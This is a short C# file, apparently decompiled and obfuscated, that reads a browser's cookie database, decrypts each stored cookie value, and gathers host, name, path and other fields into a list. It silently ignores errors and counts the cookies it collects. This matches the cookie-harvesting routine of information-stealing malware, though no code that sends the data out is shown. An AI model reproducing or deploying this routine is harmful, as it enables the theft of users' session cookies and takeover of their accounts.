using System.Collections.Generic;

internal sealed class Class89
{
	public static List<Struct0> smethod_0(string string_0)
	{
		List<Struct0> list = new List<Struct0>();
		try
		{
			Class54 @class = Class55.smethod_0(string_0, "cookies");
			if (@class == null)
			{
				return list;
			}
			for (int i = 0; i < @class.method_1(); i++)
			{
				Struct0 item = default(Struct0);
				item.String_5 = Class87.smethod_4(string_0, @class.method_0(i, 12));
				if (item.String_5 == "")
				{
					item.String_5 = @class.method_0(i, 3);
				}
				item.String_0 = Class87.smethod_2(@class.method_0(i, 1));
				item.String_1 = Class87.smethod_2(@class.method_0(i, 2));
				item.String_2 = Class87.smethod_2(@class.method_0(i, 4));
				item.String_3 = Class87.smethod_2(@class.method_0(i, 5));
				item.String_6 = Class87.smethod_2(@class.method_0(i, 6).ToUpper());
				Class36.int_3++;
				list.Add(item);
			}
			return list;
		}
		catch
		{
			return list;
		}
	}
}
